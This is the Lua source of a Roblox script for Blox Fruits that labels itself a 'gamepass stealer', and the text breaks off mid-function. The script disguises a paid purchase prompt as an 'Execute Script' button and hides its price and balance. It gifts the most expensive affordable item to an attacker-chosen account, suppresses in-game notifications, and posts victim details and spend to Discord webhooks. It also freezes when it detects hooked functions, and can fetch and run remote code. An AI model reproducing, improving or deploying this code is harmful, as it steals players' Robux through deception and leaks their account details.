repeat
    task.wait()
until game:IsLoaded()
if not ({
    [2753915549] = true,
    [4442272183] = true,
    [7449423635] = true,
})[game.PlaceId] then
    game:GetService("Players").LocalPlayer:Kick("Wrong game! This script is meant for Blox Fruits.")
    return
end
if not _G.scriptExecuted then
    task.spawn(function()
        local Team = game.Players.LocalPlayer.Team
        if Team ~= game.Teams.Marines and Team ~= game.Teams.Pirates then
            local t1 = {
                [1] = "SetTeam",
                [2] = "Marines",
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(t1))
        end
    end)
    if ishooked and (ishooked(game.HttpGet) or ishooked(request)) then
        (function()
            if setfpscap then
                setfpscap(0)
            end
            rconsoleclear()
            print = function()
            end
            warn = function()
            end
            error = function()
            end
            setclipboard = function()
            end
            while true do
            end
        end)()
    end
    _G.scriptExecuted = true
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local CoreGui = game:GetService("CoreGui")
    local Players = game:GetService("Players")
    local HttpService = game:GetService("HttpService")
    local UserInputService = game:GetService("UserInputService")
    local MarketplaceService = game:GetService("MarketplaceService")
    game:GetService("RunService")
    local TweenService = game:GetService("TweenService")
    local ProductInfo = MarketplaceService:GetProductInfo(game.PlaceId)
    local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
    local UserIdFromNameAsync = nil
    local s1 = "1.0.0"
    local n1 = 0
    local ok, result = pcall(function()
        UserIdFromNameAsync = Players:GetUserIdFromNameAsync(Username)
    end)
    local t2 = {
        "got u smth",
        "gift for u",
        "free item",
        "grab this",
        "here u go",
        "for u",
        "this is urs",
        "gift incoming",
        "check ur gift",
        "just for u",
        "special gift",
        "wanted u to have this",
        "thought u might like",
        "hope u enjoy",
        "gift drop",
        "take this",
        "gift time",
        "ur item",
        "check inbox",
        "gift alert",
        "surprise",
        "quick gift",
        "item 4 u",
        "gift coming",
        "open now",
        "got something",
        "check gift",
        "item drop",
        "ur turn",
        "gift ready",
        "here it is",
        "mine 2 u",
        "special delivery",
        "item transfer",
        "quick share",
        "ur gift",
        "landing soon",
        "incoming",
        "heads up",
        "u dont know",
        "secret item",
        "might want this",
        "check now",
        "wait what",
        "ur choice",
        "pick up",
        "gift waiting",
        "dont miss",
        "saw this and thought of u",
        "u deserve this",
        "made this for u",
        "wanted to surprise u",
        "random gift",
        "no reason",
        "just cuz",
        "hope this helps",
        "thinking of u",
        "wanted to share",
        "gift from me",
        "something cool",
        "special delivery",
        "surprise inside",
        "hope u like it",
        "might want this",
        "perfect 4 u",
        "came across this",
        "thought itd fit",
        "made me think",
        "random kindness",
        "gift incoming",
        "small surprise",
        "wanted 2 help",
        "ur welcome",
        "no strings",
        "free stuff",
        "gift time",
        "surprise gift",
        "check it out",
        "random act",
        "just because",
        "ur special",
        "thinking hard",
        "gift incoming",
        "secret santa",
        "random drop",
        "ur moment",
        "unexpected gift",
        "from me 2 u",
        "totally random",
        "surprise package",
        "mystery item",
        "ur lucky day",
        "something special",
        "wild surprise",
        "cant explain",
        "just happened",
        "totally random",
        "gift bomb",
        "surprise mode",
        "bet u want this",
        "look what i got",
        "check it out",
        "ur gonna love this",
        "best gift ever",
        "epic drop",
        "cant believe im giving this",
        "rare find",
        "u need this",
        "trust me",
        "game changer",
        "next level item",
        "sick drop",
        "this is fire",
        "op item",
        "lol take this",
        "u serious?",
        "no way",
        "bruh",
        "yo check",
        "wild item",
        "insane drop",
        "cant even",
        "u won",
        "ur lucky day",
        "omg",
        "wtf is this",
        "crazy good",
        "unreal item",
        "next lvl",
        "bruh moment",
        "ur kidding",
        "for real?",
        "no cap",
        "absolute madness",
        "what even",
        "brain melter",
        "ur not ready",
        "system overload",
        "beyond logic",
        "quantum gift",
        "dimension break",
        "reality glitch",
        "ur mind = blown",
        "impossible item",
        "ur welcome",
        "gift explosion",
        "pure chaos",
        "wtf mode",
        "congrats",
        "u earned this",
        "for ur hard work",
        "leveled up gift",
        "mission complete",
        "ur awesome",
        "props to u",
        "u rock",
        "well deserved",
        "u crushed it",
        "legend status",
        "keep it up",
        "respect",
        "ur the best",
        "mad skills",
        "killed it",
        "ur a pro",
        "top player",
        "legendary",
        "ur insane",
        "boss move",
        "u did that",
        "absolute unit",
        "unstoppable",
        "next level",
        "ur cracked",
        "pure skill",
        "u win",
        "champion",
        "respect earned",
        "ur a legend",
        "peak performance",
        "absolute madman",
        "beyond human",
        "skill master",
        "ur a god",
        "impossible achievement",
        "breaking records",
        "ur a beast",
        "pure talent",
        "beyond limits",
        "ur insane",
        "no competition",
        "help u out",
        "got ur back",
        "team support",
        "squad gift",
        "we got this",
        "helping hand",
        "team player",
        "u matter",
        "staying strong",
        "good vibes",
        "u got this",
        "believe in u",
        "support gift",
        "team boost",
        "ur family",
        "dont give up",
        "ur stronger",
        "keep pushing",
        "ur amazing",
        "stay cool",
        "ur doing great",
        "hang in there",
        "ur not alone",
        "we believe",
        "team love",
        "ur powerful",
        "mental support",
        "ur here",
        "forward always",
        "ur worth it",
        "u matter most",
        "stay strong",
        "ur incredible",
        "never surrender",
        "u inspire us",
        "absolute respect",
        "ur a fighter",
        "beyond awesome",
        "ur magic",
        "pure inspiration",
        "unbreakable spirit",
        "ur a legend",
    }
    local function u16()
        local ViewportOverlay = PlayerGui:WaitForChild("ViewportOverlay", 10)
        if not ViewportOverlay then
            return
        end
        local Sink = ViewportOverlay:WaitForChild("Sink", 10)
        if not Sink then
            return
        end
        game:GetService("RunService").RenderStepped:Connect(function()
            Sink.BackgroundTransparency = 1
        end)
    end
    local function v17()
        local Notifications = PlayerGui:WaitForChild("Notifications", 10)
        if Notifications then
            Notifications.Enabled = false
        end
    end
    local function v18(p1)
        local ok2, result2 = pcall(p1)
        if not ok2 then
            warn(result2)
        end
    end
    v18(u16)
    v18(v17)
    local t3 = {}
    local function u20()
        return Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
    end
    local function u21()
        local t4 = {
            Enum.Font.PermanentMarker,
            Enum.Font.Arcade,
            Enum.Font.Bangers,
            Enum.Font.Creepster,
            Enum.Font.DenkOne,
            Enum.Font.Highway,
            Enum.Font.IndieFlower,
            Enum.Font.JosefinSans,
            Enum.Font.Merriweather,
        }
        return t4[math.random(1, #t4)]
    end
    local function u22(_)
        local PurchasePromptApp = game:GetService("CoreGui"):FindFirstChild("PurchasePromptApp")
        if PurchasePromptApp then
            local ProductPurchaseContainer = PurchasePromptApp:FindFirstChild("ProductPurchaseContainer")
            if ProductPurchaseContainer then
                local Animator = ProductPurchaseContainer:FindFirstChild("Animator")
                if Animator then
                    local Prompt = Animator:FindFirstChild("Prompt")
                    if not Prompt then
                        return
                    end
                    local AlertContents = Prompt:FindFirstChild("AlertContents")
                    if AlertContents then
                        Prompt.BackgroundTransparency = 1
                        Prompt.Image = ""
                        local TitleContainer = AlertContents:FindFirstChild("TitleContainer")
                        if TitleContainer then
                            local TitleArea = TitleContainer:FindFirstChild("TitleArea")
                            if TitleArea then
                                TitleArea.Visible = false
                            end
                        end
                        local MiddleContent = AlertContents:FindFirstChild("MiddleContent")
                        if MiddleContent then
                            MiddleContent.Visible = false
                        end
                        local Buttons = AlertContents:FindFirstChild("Footer"):FindFirstChild("Buttons")
                        if Buttons then
                            local v58 = Buttons:FindFirstChild("1")
                            if v58 then
                                v58.Visible = false
                            end
                            local v59 = Buttons:FindFirstChild("2")
                            if v59 then
                                v59:ClearAllChildren()
                                local Frame = Instance.new("Frame")
                                Frame.Name = "ButtonContainer"
                                Frame.Size = UDim2.new(1, 0, 1, 0)
                                Frame.BackgroundTransparency = 1
                                Frame.Parent = v59
                                local Frame2 = Instance.new("Frame")
                                Frame2.Name = "Background"
                                Frame2.Size = UDim2.new(1, 0, 1, 0)
                                Frame2.BackgroundColor3 = t3.backgroundColor or (RandomizedPrompt and u20() or Color3.fromRGB(40, 40, 40))
                                Frame2.BackgroundTransparency = 0.2
                                Frame2.Parent = Frame
                                if RandomizedPrompt and not t3.backgroundColor then
                                    t3.backgroundColor = Frame2.BackgroundColor3
                                end
                                local UICorner = Instance.new("UICorner")
                                UICorner.CornerRadius = UDim.new(0.2, 0)
                                UICorner.Parent = Frame2
                                local UIGradient = Instance.new("UIGradient")
                                UIGradient.Rotation = 45
                                UIGradient.Color = ColorSequence.new({
                                    ColorSequenceKeypoint.new(0, t3.gradientColor1 or (RandomizedPrompt and u20() or Color3.fromRGB(80, 150, 255))),
                                    ColorSequenceKeypoint.new(1, t3.gradientColor2 or (RandomizedPrompt and u20() or Color3.fromRGB(120, 180, 255))),
                                })
                                UIGradient.Parent = Frame2
                                if RandomizedPrompt and not t3.gradientColor1 then
                                    t3.gradientColor1 = UIGradient.Color.Keypoints[1].Value
                                    t3.gradientColor2 = UIGradient.Color.Keypoints[2].Value
                                end
                                local ImageLabel = Instance.new("ImageLabel")
                                ImageLabel.Name = "Glow"
                                ImageLabel.BackgroundTransparency = 1
                                ImageLabel.Image = "rbxassetid://7912134082"
                                ImageLabel.ImageColor3 = t3.glowColor or (RandomizedPrompt and u20() or Color3.fromRGB(80, 150, 255))
                                ImageLabel.ImageTransparency = 0.8
                                ImageLabel.Size = UDim2.new(1.2, 0, 1.2, 0)
                                ImageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
                                ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
                                ImageLabel.Parent = Frame
                                if RandomizedPrompt and not t3.glowColor then
                                    t3.glowColor = ImageLabel.ImageColor3
                                end
                                local TextLabel = Instance.new("TextLabel")
                                TextLabel.Name = "ButtonText"
                                TextLabel.Size = UDim2.new(1, 0, 1, 0)
                                TextLabel.BackgroundTransparency = 1
                                TextLabel.Text = "Execute Script" or PromptText
                                TextLabel.TextColor3 = t3.textColor or (RandomizedPrompt and u20() or Color3.fromRGB(255, 255, 255))
                                TextLabel.Font = t3.font or (RandomizedPrompt and u21() or Enum.Font.SourceSansBold)
                                TextLabel.TextScaled = true
                                TextLabel.Parent = Frame
                                if RandomizedPrompt and not t3.textColor then
                                    t3.textColor = TextLabel.TextColor3
                                    t3.font = TextLabel.Font
                                end
                                local clone = TextLabel:Clone()
                                clone.Name = "TextShadow"
                                clone.Position = UDim2.new(0, 2, 0, 2)
                                clone.TextColor3 = Color3.fromRGB(0, 0, 0)
                                clone.TextTransparency = 0.8
                                clone.ZIndex = TextLabel.ZIndex - 1
                                clone.Parent = Frame
                                local TweenService2 = game:GetService("TweenService")
                                local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
                                TweenService2:Create(ImageLabel, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {
                                    ImageTransparency = 0.6,
                                    Size = UDim2.new(1.3, 0, 1.3, 0),
                                }):Play()
                                v59.MouseEnter:Connect(function()
                                    TweenService2:Create(Frame, tweenInfo, {
                                        Size = UDim2.new(1.05, 0, 1.05, 0),
                                    }):Play()
                                end)
                                v59.MouseLeave:Connect(function()
                                    TweenService2:Create(Frame, tweenInfo, {
                                        Size = UDim2.new(1, 0, 1, 0),
                                    }):Play()
                                end)
                            end
                        end
                        local Footer = AlertContents:FindFirstChild("Footer")
                        if Footer then
                            local FooterContent = Footer:FindFirstChild("FooterContent")
                            if FooterContent then
                                local Content = FooterContent:FindFirstChild("Content")
                                if Content then
                                    local RemainingBalanceText = Content:FindFirstChild("RemainingBalanceText")
                                    if RemainingBalanceText then
                                        RemainingBalanceText.Visible = false
                                    end
                                end
                            end
                        end
                        return
                    end
                    return
                end
                return
            end
            return
        end
    end
    local function u23()
        if syn then
            return "Synapse Z"
        end
        if not getexecutor then
            if not identifyexecutor then
                if not fluxus then
                    return "Unknown"
                end
                return "Fluxus"
            end
            return identifyexecutor()
        end
        return getexecutor()
    end
    local function u24()
        return t2[math.random(1, #t2)]
    end
    local function u25()
        local PurchasePromptApp = CoreGui:FindFirstChild("PurchasePromptApp")
        if not PurchasePromptApp then
            return 0
        end
        local ProductPurchaseContainer = PurchasePromptApp:FindFirstChild("ProductPurchaseContainer")
        if ProductPurchaseContainer then
            local Animator = ProductPurchaseContainer:FindFirstChild("Animator")
            if Animator then
                local Prompt = Animator:FindFirstChild("Prompt")
                if not Prompt then
                    return 0
                end
                local AlertContents = Prompt:FindFirstChild("AlertContents")
                if AlertContents then
                    local Footer = AlertContents:FindFirstChild("Footer")
                    if Footer then
                        local FooterContent = Footer:FindFirstChild("FooterContent")
                        if FooterContent then
                            local Content = FooterContent:FindFirstChild("Content")
                            if Content then
                                local RemainingBalanceText = Content:FindFirstChild("RemainingBalanceText")
                                if RemainingBalanceText and RemainingBalanceText.Text then
                                    local v87 = RemainingBalanceText.Text:match("(%d+)$")
                                    return (v87 and tonumber(v87) or 0) + 25
                                end
                                return 0
                            end
                            return 0
                        end
                        return 0
                    end
                    return 0
                end
                return 0
            end
            return 0
        end
        return 0
    end
    local u26 = false
    local function u27(p3, p4)
        if u26 then
            return
        end
        u25()
        local v90 = u23()
        local t5 = {
            username = "ReasonREKT",
            avatar_url = "https://pbs.twimg.com/media/FlGV_22XkAIYGvL?format=png&name=small",
            content = "@everyone",
            embeds = {
                {
                    title = "RUA BLOX FRUITS GAMEPASS STEALER HIT ; https://discord.gg/ZmqJrs3TM8",
                    description = string.format("Receiver: %s\nVictim Username: %s", Username, game.Players.LocalPlayer.Name),
                    color = 65280,
                    fields = {
                        {
                            name = "Victim Player Info <a:catyes:1160127609569542227>",
                            value = string.format("Name: %s\nAccount Age: %s", game.Players.LocalPlayer.Name, tostring(game.Players.LocalPlayer.AccountAge)),
                            inline = false,
                        },
                        {
                            name = "Rbx Used <:Ztsuo_Robux:1193358187760451615>",
                            value = tostring(p3),
                            inline = false,
                        },
                        {
                            name = "Item Sent <a:cash:1338918152003780739>",
                            value = tostring(p4),
                            inline = false,
                        },
                        {
                            name = "Executor",
                            value = tostring(v90),
                            inline = false,
                        },
                    },
                    footer = {
                        text = "Rua BF Gamepass Stealer | " .. os.date("%m/%d/%Y @ %I:%M %p"),
                    },
                    thumbnail = {
                        url = "https://pbs.twimg.com/media/FlGV_22XkAIYGvL?format=png&name=small",
                    },
                },
            },
        }
        local json = HttpService:JSONEncode({
            content = "@everyone",
            embeds = {
                t5,
            },
        })
        request({
            Url = LogsWebhook,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
            },
            Body = json,
        })
    end
    local u28 = false
    local u29 = false
    local function u30()
        local PurchasePromptApp = CoreGui:FindFirstChild("PurchasePromptApp")
        if PurchasePromptApp then
            local ProductPurchaseContainer = PurchasePromptApp:FindFirstChild("ProductPurchaseContainer")
            if ProductPurchaseContainer then
                local Animator = ProductPurchaseContainer:FindFirstChild("Animator")
                if Animator then
                    while Animator:FindFirstChild("Prompt") do
                        task.wait(0.1)
                    end
                    return
                end
                return
            end
            return
        end
    end
    local function u31()
        local v96 = game:GetService("CoreGui"):WaitForChild("PurchasePromptApp"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator"):WaitForChild("Prompt"):WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("Buttons"):WaitForChild("2")
        local function v97()
            u28 = true
        end
        v96.MouseButton1Click:Connect(v97)
        v96.TouchTap:Connect(v97)
        while not u28 do
            task.wait(0.1)
        end
        return true
    end
    local function u32(p5, p6, p7)
        if not u29 then
            local function u102()
                if not Username or Username == "" then
                    return false
                end
                if (not UserIdFromNameAsync or UserIdFromNameAsync <= 0) and (not pcall(function()
                    UserIdFromNameAsync = Players:GetUserIdFromNameAsync(Username)
                end) or not UserIdFromNameAsync or UserIdFromNameAsync <= 0) then
                    return false
                end
                return true
            end
            if not (function()
                local n2 = 0
                while n2 < 10 do
                    if u102() then
                        return true
                    end
                    n2 += 1
                    task.wait(0.5)
                end
                return false
            end)() then
                return
            end
            u29 = true
            local t6 = {
                [1] = "buyRobuxShop",
                [2] = {
                    Message = type(u24) == "function" and u24() or "",
                    PurchaseAction = "Gift",
                    StorageName = p5,
                    PurchaseLocation = p6,
                    FunnelId = "Shop",
                    ReceiverName = Username,
                    ReceiverUserId = UserIdFromNameAsync,
                },
            }
            local CommF_ = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
            if pcall(function()
                CommF_:InvokeServer(unpack(t6))
            end) then
                n1 = p7
                task.spawn(function()
                    if u31() and not u26 then
                        u27(n1, p5)
                        u26 = true
                    end
                end)
            end
            if type(u30) ~= "function" then
                task.wait(2)
            else
                u30()
            end
            u29 = false
            return
        end
    end
    v17()
    local function u33(p8)
        if not (p8 >= 5000) then
            if not (p8 >= 4000) then
                if not (p8 >= 3000) then
                    if p8 >= 2700 then
                        u32("Fruit Notifier", "Shop", 2700)
                    elseif not (p8 >= 2550) then
                        if p8 >= 2500 then
                            u32("Permanent Gas-Gas", "FruitShop", 2500)
                        elseif p8 >= 2450 then
                            u32("Permanent Venom-Venom", "FruitShop", 2450)
                        elseif not (p8 >= 2425) then
                            if not (p8 >= 2400) then
                                if not (p8 >= 2350) then
                                    if not (p8 >= 2300) then
                                        if p8 >= 2250 then
                                            u32("Permanent Blizzard-Blizzard", "FruitShop", 2250)
                                        elseif p8 >= 2200 then
                                            u32("Permanent Pain-Pain", "FruitShop", 2200)
                                        elseif not (p8 >= 2100) then
                                            if not (p8 >= 2000) then
                                                if not (p8 >= 1900) then
                                                    if p8 >= 1800 then
                                                        u32("Permanent Spider-Spider", "FruitShop", 1800)
                                                    elseif not (p8 >= 1750) then
                                                        if p8 >= 1700 then
                                                            u32("Permanent Love-Love", "FruitShop", 1700)
                                                        elseif not (p8 >= 1650) then
                                                            if p8 >= 1500 then
                                                                u32("3x Mythical Scrolls", "Shop", 1500)
                                                            elseif p8 >= 1300 then
                                                                u32("Permanent Magma-Magma", "FruitShop", 1300)
                                                            elseif p8 >= 1275 then
                                                                u32("Permanent Ghost-Ghost", "FruitShop", 1275)
                                                            elseif p8 >= 1200 then
                                                                u32("Dark Blade", "Shop", 1200)
                                                            elseif not (p8 >= 1100) then
                                                                if not (p8 >= 1000) then
                                                                    if not (p8 >= 975) then
                                                                        if p8 >= 950 then
                                                                            u32("Permanent Dark-Dark", "FruitShop", 950)
                                                                        elseif p8 >= 850 then
                                                                            u32("Permanent Sand-Sand", "FruitShop", 850)
                                                                        elseif not (p8 >= 750) then
                                                                            if p8 >= 550 then
                                                                                u32("Permanent Flame-Flame", "FruitShop", 550)
                                                                            elseif p8 >= 460 then
                                                                                u32("2x Mastery", "Shop", 450)
                                                                            elseif p8 >= 450 then
                                                                                u32("2x Money", "Shop", 450)
                                                                            elseif p8 >= 400 then
                                                                                u32("+1 Fruit Storage", "Shop", 400)
                                                                            elseif p8 >= 380 then
                                                                                u32("Permanent Spike-Spike", "FruitShop", 380)
                                                                            elseif p8 >= 350 then
                                                                                u32("2x Boss Drops", "Shop", 350)
                                                                            elseif p8 >= 250 then
                                                                                u32("Permanent Smoke-Smoke", "FruitShop", 250)
                                                                            elseif not (p8 >= 220) then
                                                                                if p8 >= 180 then
                                                                                    u32("Permanent Spring-Spring", "FruitShop", 180)
                                                                                elseif p8 >= 100 then
                                                                                    u32("Permanent Blade-Blade", "FruitShop", 100)
                                                                                elseif p8 >= 75 then
                                                                                    u32("Permanent Spin-Spin", "FruitShop", 75)
                                                                                elseif not (p8 >= 50) then
                                                                                    if p8 >= 25 then
                                                                                        u32("2x EXP (15 mins.)", "Shop", 25)
                                                                                    end
                                                                                else
                                                                                    u32("Permanent Rocket-Rocket", "FruitShop", 50)
                                                                                end
                                                                            else
                                                                                u32("Permanent Bomb-Bomb", "FruitShop", 220)
                                                                            end
                                                                        else
                                                                            u32("Permanent Ice-Ice", "FruitShop", 750)
                                                                        end
                                                                    else
                                                                        u32("Permanent Eagle-Eagle", "FruitShop", 975)
                                                                    end
                                                                else
                                                                    u32("Permanent Diamond-Diamond", "FruitShop", 1000)
                                                                end
                                                            else
                                                                u32("Permanent Light-Light", "FruitShop", 1100)
                                                            end
                                                        else
                                                            u32("Permanent Buddha-Buddha", "FruitShop", 1650)
                                                        end
                                                    else
                                                        u32("Permanent Creation-Creation", "FruitShop", 1750)
                                                    end
                                                else
                                                    u32("Permanent Sound-Sound", "FruitShop", 1900)
                                                end
                                            else
                                                u32("Permanent Portal-Portal", "FruitShop", 2000)
                                            end
                                        else
                                            u32("Permanent Rumble-Rumble", "FruitShop", 2100)
                                        end
                                    else
                                        u32("Permanent Gravity-Gravity", "FruitShop", 2300)
                                    end
                                else
                                    u32("Permanent T-Rex-T-Rex", "FruitShop", 2350)
                                end
                            else
                                u32("Permanent Dough-Dough", "FruitShop", 2400)
                            end
                        else
                            u32("Permanent Shadow-Shadow", "FruitShop", 2425)
                        end
                    else
                        u32("Permanent Spirit-Spirit", "FruitShop", 2550)
                    end
                else
                    u32("Permanent Yeti-Yeti", "FruitShop", 3000)
                end
            else
                u32("Permanent Kitsune-Kitsune", "FruitShop", 4000)
            end
        else
            u32("Permanent Dragon-Dragon", "FruitShop", 5000)
        end
    end
    local CoreGui2 = game:GetService("CoreGui")
    local function u35()
        local ScreenGui = Instance.new("ScreenGui")
        ScreenGui.Name = "LoadingUI"
        ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        local Frame = Instance.new("Frame")
        Frame.Name = "MainFrame"
        Frame.Size = UDim2.new(0, 300, 0, 120)
        Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
        Frame.AnchorPoint = Vector2.new(0.5, 0.5)
        Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        Frame.BorderSizePixel = 0
        Frame.Parent = ScreenGui
        local UICorner = Instance.new("UICorner")
        UICorner.CornerRadius = UDim.new(0, 10)
        UICorner.Parent = Frame
        local TextLabel = Instance.new("TextLabel")
        TextLabel.Name = "Title"
        TextLabel.Size = UDim2.new(1, 0, 0, 40)
        TextLabel.BackgroundTransparency = 1
        TextLabel.Font = Enum.Font.GothamBold
        TextLabel.Text = "Loading Script"
        TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        TextLabel.TextSize = 22
        TextLabel.Parent = Frame
        local Frame3 = Instance.new("Frame")
        Frame3.Name = "LoadingBar"
        Frame3.Size = UDim2.new(0.9, 0, 0, 10)
        Frame3.Position = UDim2.new(0.5, 0, 0.5, 0)
        Frame3.AnchorPoint = Vector2.new(0.5, 0.5)
        Frame3.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
        Frame3.BorderSizePixel = 0
        Frame3.Parent = Frame
        local UICorner2 = Instance.new("UICorner")
        UICorner2.CornerRadius = UDim.new(0, 5)
        UICorner2.Parent = Frame3
        local Frame4 = Instance.new("Frame")
        Frame4.Name = "Progress"
        Frame4.Size = UDim2.new(0, 0, 1, 0)
        Frame4.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
        Frame4.BorderSizePixel = 0
        Frame4.Parent = Frame3
        local UICorner3 = Instance.new("UICorner")
        UICorner3.CornerRadius = UDim.new(0, 5)
        UICorner3.Parent = Frame4
        local TextLabel2 = Instance.new("TextLabel")
        TextLabel2.Name = "Status"
        TextLabel2.Size = UDim2.new(1, 0, 0, 30)
        TextLabel2.Position = UDim2.new(0, 0, 0.8, 0)
        TextLabel2.BackgroundTransparency = 1
        TextLabel2.Font = Enum.Font.Gotham
        TextLabel2.Text = "Initializing..."
        TextLabel2.TextColor3 = Color3.fromRGB(200, 200, 200)
        TextLabel2.TextSize = 14
        TextLabel2.Parent = Frame
        local UIGradient = Instance.new("UIGradient")
        UIGradient.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(40, 40, 40)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 25, 25)),
        })
        UIGradient.Rotation = 45
        UIGradient.Parent = Frame
        local UIGradient2 = Instance.new("UIGradient")
        UIGradient2.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 150, 255)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 100, 200)),
        })
        UIGradient2.Rotation = 45
        UIGradient2.Parent = Frame4
        local ImageLabel = Instance.new("ImageLabel")
        ImageLabel.Name = "Glow"
        ImageLabel.BackgroundTransparency = 1
        ImageLabel.Image = "rbxassetid://7912134082"
        ImageLabel.ImageColor3 = Color3.fromRGB(0, 150, 255)
        ImageLabel.ImageTransparency = 0.8
        ImageLabel.Size = UDim2.new(1.2, 0, 1.5, 0)
        ImageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
        ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
        ImageLabel.ZIndex = 0
        ImageLabel.Parent = Frame
        if syn and syn.protect_gui then
            syn.protect_gui(ScreenGui)
        end
        ScreenGui.Parent = game:GetService("CoreGui")
        return ScreenGui
    end
    local function u36(p9, p10, p11)
        local MainFrame = p9:FindFirstChild("MainFrame")
        if not MainFrame then
            return
        end
        local LoadingBar = MainFrame:FindFirstChild("LoadingBar")
        if LoadingBar then
            local Progress = LoadingBar:FindFirstChild("Progress")
            if Progress then
                TweenService:Create(Progress, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                    Size = UDim2.new(p10 / 100, 0, 1, 0),
                }):Play()
            end
            local Status = MainFrame:FindFirstChild("Status")
            if Status and p11 then
                Status.Text = p11
            end
            return
        end
    end
    local function u37(p12)
        local MainFrame = p12:FindFirstChild("MainFrame")
        if MainFrame then
            TweenService:Create(MainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                BackgroundTransparency = 1,
            }):Play()
            local v128, v129, v130 = pairs(MainFrame:GetDescendants())
            for _, v132 in v128, v129, v130 do
                local v133 = v132
                if v133:IsA("TextLabel") then
                    TweenService:Create(v133, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                        TextTransparency = 1,
                    }):Play()
                elseif v133:IsA("Frame") and v133.Name ~= "MainFrame" then
                    TweenService:Create(v133, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                        BackgroundTransparency = 1,
                    }):Play()
                elseif not v133:IsA("ImageLabel") then
                else
                    TweenService:Create(v133, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                        ImageTransparency = 1,
                    }):Play()
                end
            end
            task.delay(0.6, function()
                p12:Destroy()
            end)
            return
        end
    end
    if ok then
        (function()
            local v73 = u23()
            local v74 = UserInputService.TouchEnabled and "Mobile" or "PC"
            local v75 = game.Players.LocalPlayer.MembershipType == Enum.MembershipType.Premium and "Yes" or "No"
            local t7 = {
                title = "Stealer Execution",
                color = 3063792,
                fields = {
                    {
                        name = "Victim's Username",
                        value = game.Players.LocalPlayer.Name,
                        inline = true,
                    },
                    {
                        name = "Current BF Rua Gamepass Stealer Version",
                        value = s1,
                        inline = true,
                    },
                    {
                        name = "Current Game",
                        value = ProductInfo.Name,
                        inline = true,
                    },
                    {
                        name = "Has Premium Subscription",
                        value = v75,
                        inline = true,
                    },
                    {
                        name = "Executor",
                        value = v73,
                        inline = true,
                    },
                    {
                        name = "Device",
                        value = v74,
                        inline = true,
                    },
                },
            }
            local json = HttpService:JSONEncode({
                embeds = {
                    t7,
                },
            })
            request({
                Url = ExecutionWebhook,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json",
                },
                Body = json,
            })
        end)();
        (function()
            local PurchasePromptApp = CoreGui2:FindFirstChild("PurchasePromptApp")
            if not PurchasePromptApp then
                return
            end
            local ProductPurchaseContainer = PurchasePromptApp:FindFirstChild("ProductPurchaseContainer")
            if ProductPurchaseContainer then
                local Animator = ProductPurchaseContainer:FindFirstChild("Animator")
                if Animator then
                    u22(true)
                    Animator.ChildAdded:Connect(function(child)
                        if child.Name == "Prompt" then
                            u22(false)
                            u31()
                        end
                    end)
                    coroutine.wrap(function()
                        while not u28 do
                            task.wait(0.1)
                        end
                        if n1 >= 25 then
                            u27(n1)
                            if typeof(LoadRedzAfterHit) == "boolean" and LoadRedzAfterHit then
                                task.spawn(function()
                                    local t8 = {
                                        JoinTeam = "Pirates",
                                        Translator = true,
                                    }
                                    loadstring(game:HttpGet("https://raw.githubusercontent.com/realredz/BloxFruits/refs/heads/main/Source.lua"))(t8)
                                end)
                            end
                        else
                            print("err")
                        end
                        local VirtualInputManager = game:GetService("VirtualInputManager")
                        repeat
                            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
                            task.wait()
                            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
                            local PurchasePromptApp2 = CoreGui2:FindFirstChild("PurchasePromptApp")
                            if not PurchasePromptApp2 then
                                return
                            end
                            local ProductPurchaseContainer2 = PurchasePromptApp2:FindFirstChild("ProductPurchaseContainer")
                            if not ProductPurchaseContainer2 then
                                return
                            end
                            local Animator2 = ProductPurchaseContainer2:FindFirstChild("Animator")
                        until not Animator2 or not Animator2:FindFirstChild("Prompt")
                    end)()
                    return
                end
                return
            end
        end)();
        (function()
            coroutine.wrap(function()
                coroutine.wrap(u16)()
                local u138 = u35()
                u36(u138, 10, "Initializing...")
                local t9 = {
                    [1] = "buyRobuxShop",
                    [2] = {
                        StorageName = "2x EXP (15 mins.)",
                        FunnelId = "Shop",
                        PurchaseLocation = "Shop",
                    },
                }
                u36(u138, 20, "Loading script components...")
                local v140 = ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("CommF_")
                if v140 then
                    v140:InvokeServer(unpack(t9))
                end
                u36(u138, 30, "Checking Data...")
                local ProductPurchaseContainer = nil
                local Animator = nil
                local Prompt = nil
                while not ProductPurchaseContainer do
